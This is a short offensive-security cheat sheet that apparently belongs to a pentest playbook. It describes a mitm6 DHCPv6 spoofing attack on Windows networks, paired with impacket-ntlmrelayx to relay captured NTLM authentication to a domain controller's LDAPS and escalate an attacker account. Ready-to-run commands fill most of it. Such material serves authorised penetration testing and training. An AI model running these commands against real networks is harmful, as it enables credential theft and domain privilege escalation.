# 03.20 mitm6

> DHCPv6 spoofer for Windows IPv6 attacks — set ourselves as DNS server, then poison and relay.

## Overview

Modern Windows hosts prefer IPv6 over IPv4. mitm6 spoofs DHCPv6 advertisements, makes itself the default DNS server, and proxies/poisons name resolution to capture NTLM auth or redirect HTTP traffic. Paired with ntlmrelayx for end-to-end relay attacks that work even when LLMNR/NBT-NS are disabled.

## Steps

- **Step 1** - Install via pip.
- **Step 2** - Start mitm6 on attack interface.
- **Step 3** - Start ntlmrelayx in parallel to relay captured auth.
- **Step 4** - Wait — Windows DHCPv6 renewals happen ~3 minutes by default.

## Commands

### Install

```bash
pipx install mitm6
# or pip install mitm6
```

### Basic poison

```bash
sudo mitm6 -d <DOMAIN> -i <NIC>
```

### Paired with ntlmrelayx

```bash
# Terminal 1
sudo mitm6 -d <DOMAIN> -i <NIC>
# Terminal 2 — relay LDAP to escalate user
impacket-ntlmrelayx -6 -t ldaps://<DC> --escalate-user <ATTACKER-USER> -wh fakewpad.<DOMAIN>
```

### Specific targets only

```bash
sudo mitm6 -d <DOMAIN> -i <NIC> --host-allowlist <TARGET-FQDN>
```
